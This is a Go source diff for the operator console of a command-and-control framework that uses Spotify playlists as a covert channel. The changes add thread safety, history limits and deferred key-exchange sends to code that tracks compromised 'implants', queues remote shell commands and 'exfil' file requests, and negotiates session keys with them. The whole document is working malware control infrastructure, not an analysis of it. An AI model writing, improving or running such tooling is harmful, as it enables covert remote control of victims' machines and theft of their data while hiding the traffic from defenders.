@@ -39,7 +39,26 @@ var cuteNames = []string{
 	"Cosmos", "Comet", "Atlas", "Nebula", "Quasar",
 	"Pulsar", "Zenith", "Apogee", "Solstice", "Aurora",
 }
-var cuteNameIdx int
+
+var (
+	cuteNameIdx int
+	cuteNameMu  sync.Mutex
+)
+
+// nextCuteName returns the next alias, safe for concurrent use.
+func nextCuteName() string {
+	cuteNameMu.Lock()
+	defer cuteNameMu.Unlock()
+	name := cuteNames[cuteNameIdx%len(cuteNames)]
+	cuteNameIdx++
+	return name
+}
+
+// History limits and save debouncing.
+const (
+	maxHistoryEntries  = 1000
+	historySaveMinWait = 2 * time.Second
+)
 
 // ClientInfo holds information about a connected implant.
 type ClientInfo struct {
@@ -47,7 +66,7 @@ type ClientInfo struct {
 	OS          string
 	User        string
 	ConnectedAt string
-	LastCheckin  time.Time
+	LastCheckin time.Time
 	PID         int
 	SessionID   string
 	Alias       string
@@ -66,26 +85,47 @@ type HistoryEntry struct {
 	RecvAt    time.Time `json:"recv_at,omitempty"`
 }
 
+// kxJob is a pending keyexchange message to send after the state lock
+// is released (API calls must not happen under op.mu).
+type kxJob struct {
+	clientID string
+	msg      *protocol.C2Message
+}
+
 // Operator sends commands and retrieves results.
+//
+// Concurrency: the interactive loop, the background poller, and the
+// ishell result drainer all touch shared state. op.mu guards ALL of it
+// (agents, session keys, pending seqs, history, attach state). op.pollMu
+// serializes PollResults so only one goroutine polls Spotify at a time.
 type Operator struct {
-	client           *spotify.Client
-	key              string
+	client       *spotify.Client
+	key          string
+	pollInterval time.Duration
+	historyFile  string
+	rl           *readline.Instance
+
+	// Immutable after construction
+	ephPriv *ecdh.PrivateKey
+	ephPub  *ecdh.PublicKey
+
+	pollMu sync.Mutex // serializes PollResults API calls
+
+	mu               sync.RWMutex
 	nextSeq          int
 	pendingSeqs      map[int]string        // seq -> module name
-	connectedClients map[string]ClientInfo  // client_id -> info
+	connectedClients map[string]ClientInfo // client_id -> info
 	pollBackoff      time.Duration         // 0 = normal, >0 = rate limited
 	lastPoll         time.Time             // timestamp of last successful poll
-	pollInterval     time.Duration         // background poll interval
 	attachedClient   string                // currently attached client_id ("" = none)
 	history          []HistoryEntry        // command/result history
-	historyFile      string                // path to persist history
-	rl               *readline.Instance    // readline for arrow key history
+	historyIdx       map[int]int           // seq -> index of latest history entry
+	historyDirty     bool                  // unsaved history changes
+	lastHistorySave  time.Time
 
 	// Forward secrecy via X25519
-	ephPriv        *ecdh.PrivateKey
-	ephPub         *ecdh.PublicKey
-	sessionKeys    map[string][]byte // client_id -> ACTIVE session key
-	pendingKeys    map[string][]byte // client_id -> session key awaiting implant confirmation
+	sessionKeys map[string][]byte // client_id -> ACTIVE session key
+	pendingKeys map[string][]byte // client_id -> session key awaiting implant confirmation
 }
 
 // NewOperator creates a new operator.
@@ -123,6 +163,7 @@ func NewOperator(client *spotify.Client, key string, pollIntervalSec int) *Opera
 		ephPub:           ephPub,
 		sessionKeys:      make(map[string][]byte),
 		pendingKeys:      make(map[string][]byte),
+		historyIdx:       make(map[int]int),
 		historyFile:      histFile,
 	}
 	op.loadHistory()
@@ -132,6 +173,9 @@ func NewOperator(client *spotify.Client, key string, pollIntervalSec int) *Opera
 // SendCommand queues a command for the implant.
 func (op *Operator) SendCommand(module string, args map[string]interface{}) (int, error) {
 	ctx := context.Background()
+
+	// Phase 1: allocate seq and encode under lock (reads shared state)
+	op.mu.Lock()
 	seq := op.nextSeq
 	op.nextSeq++
 
@@ -163,9 +207,22 @@ func (op *Operator) SendCommand(module string, args map[string]interface{}) (int
 		encoded, err = protocol.EncodeMessage(msg.ToCommandMap(), op.key)
 	}
 	if err != nil {
+		op.mu.Unlock()
 		return 0, fmt.Errorf("encode: %w", err)
 	}
 
+	// Build history command string while locked
+	cmdStr := module
+	if args != nil {
+		if cmd, ok := args["cmd"].(string); ok {
+			cmdStr = cmd
+		} else if path, ok := args["path"].(string); ok {
+			cmdStr = "exfil " + path
+		}
+	}
+	op.mu.Unlock()
+
+	// Phase 2: API calls without the lock
 	chunks, err := protocol.ChunkPayload(encoded, seq,
 		protocol.ChannelCmd, op.key)
 	if err != nil {
@@ -176,25 +233,22 @@ func (op *Operator) SendCommand(module string, args map[string]interface{}) (int
 		return 0, fmt.Errorf("write: %w", err)
 	}
 
+	// Phase 3: record under lock
+	op.mu.Lock()
 	op.pendingSeqs[seq] = module
-
-	// Record in history
-	cmdStr := module
-	if args != nil {
-		if cmd, ok := args["cmd"].(string); ok {
-			cmdStr = cmd
-		} else if path, ok := args["path"].(string); ok {
-			cmdStr = "exfil " + path
-		}
-	}
-	op.recordCommand(seq, module, cmdStr)
+	op.recordCommandLocked(seq, module, cmdStr)
+	op.mu.Unlock()
 
 	fmt.Printf("[*] Command queued: seq=%d module=%s\n", seq, module)
 	return seq, nil
 }
 
 // PollResults does a single poll pass for results.
+// Serialized via pollMu: only one goroutine polls Spotify at a time.
 func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
+	op.pollMu.Lock()
+	defer op.pollMu.Unlock()
+
 	ctx := context.Background()
 	seqGroups, err := op.client.ReadC2Playlists(ctx,
 		protocol.ChannelRes, op.key, -1)
@@ -203,6 +257,10 @@ func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
 	}
 
 	results := make(map[int]map[string]interface{})
+	var cleanups []int
+	var kxJobs []*kxJob
+
+	op.mu.Lock()
 	for seqNum, chunkMetas := range seqGroups {
 		payload := protocol.ReassemblePayload(chunkMetas)
 
@@ -241,33 +299,57 @@ func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
 		if decErr != nil || result == nil {
 			// Can't decrypt — result from prior session (different X25519 keys)
 			// Mark in history as lost
-			op.recordResult(seqNum, "lost",
+			op.recordResultLocked(seqNum, "lost",
 				"(encrypted with prior session key — forward secrecy)")
-			_ = op.client.CleanC2Playlists(ctx,
-				protocol.ChannelRes, op.key, seqNum)
+			cleanups = append(cleanups, seqNum)
 			continue
 		}
 		// Handle checkin beacon
 		if module, ok := result["module"].(string); ok && module == "checkin" {
-			op.handleCheckin(result)
-			_ = op.client.CleanC2Playlists(ctx,
-				protocol.ChannelRes, op.key, seqNum)
+			if job := op.handleCheckinLocked(result); job != nil {
+				kxJobs = append(kxJobs, job)
+			}
+			cleanups = append(cleanups, seqNum)
 			continue
 		}
 		results[seqNum] = result
 		// Record result in history
 		status, _ := result["status"].(string)
 		data, _ := result["data"].(string)
-		op.recordResult(seqNum, status, data)
-		_ = op.client.CleanC2Playlists(ctx,
-			protocol.ChannelRes, op.key, seqNum)
+		op.recordResultLocked(seqNum, status, data)
+		cleanups = append(cleanups, seqNum)
 		delete(op.pendingSeqs, seqNum)
+	}
+	op.mu.Unlock()
+
+	// API calls after releasing the lock
+	for _, job := range kxJobs {
+		op.sendKeyExchange(job)
+	}
+	for _, seqNum := range cleanups {
+		_ = op.client.CleanC2Playlists(ctx, protocol.ChannelRes, op.key, seqNum)
 	}
 	return results, nil
 }
 
 // getHistoryResult checks if a result is already cached in history.
 func (op *Operator) getHistoryResult(seq int) map[string]interface{} {
+	op.mu.RLock()
+	defer op.mu.RUnlock()
+
+	// Fast path: O(1) index lookup
+	if idx, ok := op.historyIdx[seq]; ok && idx < len(op.history) {
+		h := op.history[idx]
+		if h.Status != "" && h.Status != "pending" {
+			return map[string]interface{}{
+				"module": h.Module,
+				"seq":    float64(h.Seq),
+				"status": h.Status,
+				"data":   h.Result,
+			}
+		}
+	}
+	// Fallback: linear scan for older entries with the same seq
 	for i := len(op.history) - 1; i >= 0; i-- {
 		h := op.history[i]
 		if h.Seq == seq && h.Status != "" && h.Status != "pending" {
@@ -320,6 +402,9 @@ func (op *Operator) WaitForResult(seq int) (map[string]interface{}, error) {
 func (op *Operator) checkForCheckins() bool {
 	// Always poll — this handles checkins + results
 	results, err := op.PollResults()
+
+	op.mu.Lock()
+	defer op.mu.Unlock()
 	if err != nil {
 		wait := handleAPIError(err, "poll")
 		if wait > 0 {
@@ -345,14 +430,12 @@ func (op *Operator) checkForCheckins() bool {
 	}
 	sort.Ints(seqs)
 	for _, s := range seqs {
-		// Only show results belonging to the attached agent
-		for i := len(op.history) - 1; i >= 0; i-- {
-			if op.history[i].Seq == s && op.history[i].ClientID == op.attachedClient {
-				fmt.Println()
-				displayResult(s, results[s])
-				fmt.Print(op.prompt())
-				break
-			}
+		// Only show results belonging to the attached agent (O(1) lookup)
+		if idx, ok := op.historyIdx[s]; ok && idx < len(op.history) &&
+			op.history[idx].ClientID == op.attachedClient {
+			fmt.Println()
+			displayResult(s, results[s])
+			fmt.Print(op.promptLocked())
 		}
 	}
 	return true
@@ -369,11 +452,14 @@ func (op *Operator) startBackgroundPoller(stopCh chan struct{}) {
 			return
 		case <-time.After(interval):
 			// Respect rate limit backoff
+			op.mu.Lock()
 			if op.pollBackoff > 0 {
 				interval = op.pollBackoff
 				op.pollBackoff = 0
+				op.mu.Unlock()
 				continue
 			}
+			op.mu.Unlock()
 
 			found := op.checkForCheckins()
 			if found {
@@ -418,6 +504,7 @@ func (op *Operator) Interactive() {
 	defer func() {
 		close(stopCh)
 		op.sendShutdown()
+		op.FlushHistory()
 	}()
 
 	// Set up readline with history
@@ -432,7 +519,8 @@ func (op *Operator) Interactive() {
 		EOFPrompt:       "exit",
 	})
 	if err != nil {
-		fmt.Printf("[!] Readline init failed: %v, falling back to basic input\n", err)
+		fmt.Printf("[!] Readline init failed: %v\n", err)
+		return
 	}
 	op.rl = rl
 	defer rl.Close()
@@ -550,7 +638,10 @@ func (op *Operator) Interactive() {
 			op.printStatus()
 		default:
 			// When attached, treat unknown commands as shell commands
-			if op.attachedClient != "" {
+			op.mu.RLock()
+			attached := op.attachedClient != ""
+			op.mu.RUnlock()
+			if attached {
 				op.SendCommand("shell", map[string]interface{}{"cmd": line})
 			} else {
 				fmt.Printf("[!] Unknown command: %s. Type 'help'.\n", cmd)
@@ -559,8 +650,8 @@ func (op *Operator) Interactive() {
 	}
 }
 
-// prompt returns the current prompt string based on attach state.
-func (op *Operator) prompt() string {
+// promptLocked returns the current prompt string. Caller must hold op.mu.
+func (op *Operator) promptLocked() string {
 	ts := time.Now().Format("15:04")
 	if op.attachedClient != "" {
 		info := op.connectedClients[op.attachedClient]
@@ -570,8 +661,18 @@ func (op *Operator) prompt() string {
 	return fmt.Sprintf("[%s] c2> ", ts)
 }
 
+// prompt returns the current prompt string based on attach state.
+func (op *Operator) prompt() string {
+	op.mu.RLock()
+	defer op.mu.RUnlock()
+	return op.promptLocked()
+}
+
 // printAgents shows a table of connected implants.
 func (op *Operator) printAgents() {
+	op.mu.RLock()
+	defer op.mu.RUnlock()
+
 	if len(op.connectedClients) == 0 {
 		fmt.Println("[*] No agents connected")
 		return
@@ -598,6 +699,9 @@ func (op *Operator) printAgents() {
 
 // attachAgent attaches to a specific agent by client_id (or prefix).
 func (op *Operator) attachAgent(idOrAlias string) {
+	op.mu.Lock()
+	defer op.mu.Unlock()
+
 	if idOrAlias == "" {
 		// If only one agent, auto-attach
 		if len(op.connectedClients) == 1 {
@@ -630,6 +734,9 @@ func (op *Operator) attachAgent(idOrAlias string) {
 
 // detachAgent detaches from the current agent.
 func (op *Operator) detachAgent() {
+	op.mu.Lock()
+	defer op.mu.Unlock()
+
 	if op.attachedClient == "" {
 		fmt.Println("[*] Not attached to any agent")
 		return
@@ -642,6 +749,8 @@ func (op *Operator) detachAgent() {
 
 // requireAttached checks if an agent is attached before running commands.
 func (op *Operator) requireAttached() bool {
+	op.mu.RLock()
+	defer op.mu.RUnlock()
 	if op.attachedClient == "" {
 		fmt.Println("[!] No agent attached. Use 'agents' to list, 'attach <id>' to select.")
 		return false
@@ -653,8 +762,10 @@ func (op *Operator) requireAttached() bool {
 // Detects client OS and shows appropriate prompt ($ or >).
 // Each command is sent, then waits with animated dots until result arrives.
 func (op *Operator) interactiveShell() {
+	op.mu.RLock()
 	clientID := op.attachedClient
 	info := op.connectedClients[clientID]
+	op.mu.RUnlock()
 
 	// Determine shell type from OS
 	isWindows := strings.Contains(strings.ToLower(info.OS), "windows")
@@ -680,7 +791,9 @@ func (op *Operator) interactiveShell() {
 	var pending []pendingCmd
 	var mu sync.Mutex
 
-	// Background result drainer
+	// Background result drainer. PollResults is serialized with the main
+	// background poller via pollMu; results consumed by either side are
+	// found via the shared history cache.
 	stopDrain := make(chan struct{})
 	go func() {
 		for {
@@ -689,35 +802,46 @@ func (op *Operator) interactiveShell() {
 				return
 			case <-time.After(3 * time.Second):
 				results, err := op.PollResults()
-				if err != nil || len(results) == 0 {
+				if err != nil {
 					continue
 				}
 
 				mu.Lock()
 				for i := 0; i < len(pending); i++ {
 					pc := pending[i]
-					if result, ok := results[pc.seq]; ok {
-						// Clear current line, print result
-						fmt.Printf("\r\033[K")
-
-						data, _ := result["data"].(string)
-						status, _ := result["status"].(string)
-
-						// Show which command this is for
-						fmt.Printf("\033[90m$ %s\033[0m\n", pc.cmd)
-						if status == "error" {
-							fmt.Printf("\033[31m%s\033[0m", data)
-						} else {
-							fmt.Print(data)
+					result, ok := results[pc.seq]
+					if !ok {
+						// Background poller may have consumed it —
+						// check the shared history cache
+						if cached := op.getHistoryResult(pc.seq); cached != nil {
+							result = cached
+							ok = true
 						}
-						if len(data) > 0 && data[len(data)-1] != '\n' {
-							fmt.Println()
-						}
-
-						// Remove from pending
-						pending = append(pending[:i], pending[i+1:]...)
-						i--
 					}
+					if !ok {
+						continue
+					}
+
+					// Clear current line, print result
+					fmt.Printf("\r\033[K")
+
+					data, _ := result["data"].(string)
+					status, _ := result["status"].(string)
+
+					// Show which command this is for
+					fmt.Printf("\033[90m$ %s\033[0m\n", pc.cmd)
+					if status == "error" {
+						fmt.Printf("\033[31m%s\033[0m", data)
+					} else {
+						fmt.Print(data)
+					}
+					if len(data) > 0 && data[len(data)-1] != '\n' {
+						fmt.Println()
+					}
+
+					// Remove from pending
+					pending = append(pending[:i], pending[i+1:]...)
+					i--
 				}
 
 				// Show queue status and re-print prompt
@@ -809,11 +933,14 @@ func (op *Operator) sendShutdown() {
 	ctx := context.Background()
 	msg := protocol.NewC2Message("shutdown", -1)
 	msg.Data = "operator exited"
+
+	op.mu.RLock()
 	if op.attachedClient != "" {
 		if info, ok := op.connectedClients[op.attachedClient]; ok {
 			msg.SessionID = info.SessionID
 		}
 	}
+	op.mu.RUnlock()
 
 	encoded, err := protocol.EncodeMessage(msg.ToCommandMap(), op.key)
 	if err != nil {
@@ -829,6 +956,9 @@ func (op *Operator) sendShutdown() {
 }
 
 func (op *Operator) printStatus() {
+	op.mu.RLock()
+	defer op.mu.RUnlock()
+
 	if len(op.connectedClients) > 0 {
 		fmt.Printf("[*] Connected implants (%d):\n", len(op.connectedClients))
 		for cid, info := range op.connectedClients {
@@ -838,7 +968,6 @@ func (op *Operator) printStatus() {
 			}
 			fmt.Printf("  \033[1m%-10s\033[0m %s  %s  fs=%s\n",
 				info.Alias, info.Hostname, info.OS, fs)
-			_ = cid
 		}
 	} else {
 		fmt.Println("[*] No implants connected")
@@ -866,11 +995,13 @@ func (op *Operator) printStatus() {
 	}
 }
 
-func (op *Operator) handleCheckin(result map[string]interface{}) {
+// handleCheckinLocked processes a checkin result. Caller must hold op.mu.
+// Returns a kxJob to send after the lock is released, or nil.
+func (op *Operator) handleCheckinLocked(result map[string]interface{}) *kxJob {
 	data, _ := result["data"].(string)
 	var info map[string]interface{}
 	if err := json.Unmarshal([]byte(data), &info); err != nil {
-		return
+		return nil
 	}
 	clientID, _ := info["client_id"].(string)
 	hostname, _ := info["hostname"].(string)
@@ -883,7 +1014,7 @@ func (op *Operator) handleCheckin(result map[string]interface{}) {
 		if existing.SessionID == sessionID {
 			existing.LastCheckin = time.Now()
 			op.connectedClients[clientID] = existing
-			return
+			return nil
 		}
 		// Different session — agent reconnected, update and re-negotiate
 		fmt.Printf("\n\033[36m[*] Implant %s reconnected (new session)\033[0m\n",
@@ -898,15 +1029,14 @@ func (op *Operator) handleCheckin(result map[string]interface{}) {
 	timestamp := time.Now().Format("2006-01-02 15:04:05")
 
 	// Assign a cute alias
-	alias := cuteNames[cuteNameIdx%len(cuteNames)]
-	cuteNameIdx++
+	alias := nextCuteName()
 
 	op.connectedClients[clientID] = ClientInfo{
 		Hostname:    hostname,
 		OS:          osInfo,
 		User:        user,
 		ConnectedAt: timestamp,
-		LastCheckin:  time.Now(),
+		LastCheckin: time.Now(),
 		PID:         pid,
 		SessionID:   sessionID,
 		Alias:       alias,
@@ -920,50 +1050,52 @@ func (op *Operator) handleCheckin(result map[string]interface{}) {
 		"    user      : %s\n"+
 		"    timestamp : %s\n\n%s",
 		alias, alias, clientID[:8], hostname, osInfo, user, timestamp,
-		op.prompt())
+		op.promptLocked())
 
 	// Negotiate forward secrecy if implant sent a pubkey
 	if peerPubHex, ok := info["pubkey"].(string); ok && peerPubHex != "" {
-		op.negotiateForwardSecrecy(clientID, peerPubHex)
+		return op.prepareForwardSecrecyLocked(clientID, peerPubHex)
 	}
+	return nil
 }
 
-// negotiateForwardSecrecy computes the shared secret and sends a keyexchange
-// command to the implant.
-func (op *Operator) negotiateForwardSecrecy(clientID, peerPubHex string) {
+// prepareForwardSecrecyLocked computes the shared secret, stores it as
+// pending, and builds a keyexchange job. Caller must hold op.mu.
+// The actual API send happens in sendKeyExchange after the lock is released.
+func (op *Operator) prepareForwardSecrecyLocked(clientID, peerPubHex string) *kxJob {
 	if op.ephPriv == nil {
-		return
+		return nil
 	}
 
 	peerPubBytes, err := hex.DecodeString(peerPubHex)
 	if err != nil {
 		fmt.Printf("[!] Forward secrecy failed for %s: invalid pubkey hex\n", clientID[:8])
-		return
+		return nil
 	}
 
 	peerPub, err := ecdh.X25519().NewPublicKey(peerPubBytes)
 	if err != nil {
 		fmt.Printf("[!] Forward secrecy failed for %s: invalid X25519 pubkey\n", clientID[:8])
-		return
+		return nil
 	}
 
 	sharedSecret, err := op.ephPriv.ECDH(peerPub)
 	if err != nil {
 		fmt.Printf("[!] Forward secrecy failed for %s: ECDH error\n", clientID[:8])
-		return
+		return nil
 	}
 
 	sessionKey, err := crypto.DeriveSessionKey(sharedSecret, op.key)
 	if err != nil {
 		fmt.Printf("[!] Forward secrecy failed for %s: key derivation error\n", clientID[:8])
-		return
+		return nil
 	}
 
 	// Store as pending until implant confirms by sending a result we can decrypt
 	op.pendingKeys[clientID] = sessionKey
 
-	// Send keyexchange command directly (no attach needed).
-	// Must use master key since implant hasn't derived session key yet.
+	// Build keyexchange command. Must use master key since the implant
+	// hasn't derived the session key yet.
 	msg := protocol.NewC2Message("keyexchange", op.nextSeq)
 	op.nextSeq++
 	msg.PubKey = hex.EncodeToString(op.ephPub.Bytes())
@@ -973,21 +1105,30 @@ func (op *Operator) negotiateForwardSecrecy(clientID, peerPubHex string) {
 		msg.SessionID = info.SessionID
 	}
 
-	encoded, err := protocol.EncodeMessage(msg.ToCommandMap(), op.key)
+	return &kxJob{clientID: clientID, msg: msg}
+}
+
+// sendKeyExchange transmits a prepared keyexchange command to the implant.
+// Must NOT be called under op.mu (performs API calls).
+func (op *Operator) sendKeyExchange(job *kxJob) {
+	encoded, err := protocol.EncodeMessage(job.msg.ToCommandMap(), op.key)
 	if err != nil {
-		fmt.Printf("[!] Failed to send keyexchange to %s: %v\n", clientID[:8], err)
+		fmt.Printf("[!] Failed to send keyexchange to %s: %v\n", job.clientID[:8], err)
 		return
 	}
 
 	ctx := context.Background()
-	chunks, err := protocol.ChunkPayload(encoded, msg.Seq,
+	chunks, err := protocol.ChunkPayload(encoded, job.msg.Seq,
 		protocol.ChannelCmd, op.key)
 	if err != nil {
 		return
 	}
-	_ = op.client.WriteC2Playlists(ctx, chunks)
+	if err := op.client.WriteC2Playlists(ctx, chunks); err != nil {
+		fmt.Printf("[!] Failed to send keyexchange to %s: %v\n", job.clientID[:8], err)
+		return
+	}
 
-	fmt.Printf("[*] Forward secrecy established with %s\n", clientID[:8])
+	fmt.Printf("[*] Forward secrecy established with %s\n", job.clientID[:8])
 }
 
 func displayResult(seq int, result map[string]interface{}) {
@@ -1044,15 +1185,60 @@ func (op *Operator) loadHistory() {
 	if err != nil {
 		return
 	}
+	op.mu.Lock()
+	defer op.mu.Unlock()
 	_ = json.Unmarshal(data, &op.history)
+	// Cap loaded history and build the seq index
+	if len(op.history) > maxHistoryEntries {
+		op.history = op.history[len(op.history)-maxHistoryEntries:]
+	}
+	op.rebuildHistoryIdxLocked()
 }
 
-func (op *Operator) saveHistory() {
-	data, _ := json.MarshalIndent(op.history, "", "  ")
-	_ = os.WriteFile(op.historyFile, data, 0600)
+// rebuildHistoryIdxLocked rebuilds the seq -> latest-entry index.
+// Caller must hold op.mu.
+func (op *Operator) rebuildHistoryIdxLocked() {
+	op.historyIdx = make(map[int]int, len(op.history))
+	for i, h := range op.history {
+		op.historyIdx[h.Seq] = i
+	}
 }
 
-func (op *Operator) recordCommand(seq int, module, command string) {
+// saveHistoryLocked marks history dirty and flushes to disk at most once
+// per historySaveMinWait. Caller must hold op.mu.
+func (op *Operator) saveHistoryLocked() {
+	op.historyDirty = true
+	if time.Since(op.lastHistorySave) < historySaveMinWait {
+		return
+	}
+	op.flushHistoryLocked()
+}
+
+// flushHistoryLocked writes history to disk if dirty. Caller must hold op.mu.
+func (op *Operator) flushHistoryLocked() {
+	if !op.historyDirty {
+		return
+	}
+	data, err := json.MarshalIndent(op.history, "", "  ")
+	if err != nil {
+		return
+	}
+	if err := os.WriteFile(op.historyFile, data, 0600); err != nil {
+		return
+	}
+	op.historyDirty = false
+	op.lastHistorySave = time.Now()
+}
+
+// FlushHistory forces a history save. Call on shutdown.
+func (op *Operator) FlushHistory() {
+	op.mu.Lock()
+	defer op.mu.Unlock()
+	op.flushHistoryLocked()
+}
+
+// recordCommandLocked appends a command to history. Caller must hold op.mu.
+func (op *Operator) recordCommandLocked(seq int, module, command string) {
 	clientID := op.attachedClient
 	sessionID := ""
 	if info, ok := op.connectedClients[clientID]; ok {
@@ -1066,22 +1252,44 @@ func (op *Operator) recordCommand(seq int, module, command string) {
 		Command:   command,
 		SentAt:    time.Now(),
 	})
-	op.saveHistory()
+	op.historyIdx[seq] = len(op.history) - 1
+
+	// Cap history size, rebuilding the index after a trim
+	if len(op.history) > maxHistoryEntries {
+		op.history = op.history[len(op.history)-maxHistoryEntries:]
+		op.rebuildHistoryIdxLocked()
+	}
+	op.saveHistoryLocked()
 }
 
-func (op *Operator) recordResult(seq int, status, data string) {
+// recordResultLocked records a result against its command. Caller must hold op.mu.
+func (op *Operator) recordResultLocked(seq int, status, data string) {
+	// Fast path: O(1) index lookup for the latest entry with this seq
+	if idx, ok := op.historyIdx[seq]; ok && idx < len(op.history) {
+		if op.history[idx].Status == "" {
+			op.history[idx].Status = status
+			op.history[idx].Result = data
+			op.history[idx].RecvAt = time.Now()
+			op.saveHistoryLocked()
+			return
+		}
+	}
+	// Fallback: linear scan (entry from a previous operator session)
 	for i := len(op.history) - 1; i >= 0; i-- {
 		if op.history[i].Seq == seq && op.history[i].Status == "" {
 			op.history[i].Status = status
 			op.history[i].Result = data
 			op.history[i].RecvAt = time.Now()
-			op.saveHistory()
+			op.saveHistoryLocked()
 			return
 		}
 	}
 }
 
 func (op *Operator) printHistory() {
+	op.mu.RLock()
+	defer op.mu.RUnlock()
+
 	if len(op.history) == 0 {
 		fmt.Println("[*] No command history")
 		return
@@ -1134,6 +1342,9 @@ func (op *Operator) showResult(seqStr string) {
 		fmt.Println("[!] Usage: result <seq>")
 		return
 	}
+
+	op.mu.RLock()
+	defer op.mu.RUnlock()
 
 	for i := len(op.history) - 1; i >= 0; i-- {
 		if op.history[i].Seq == seqNum {
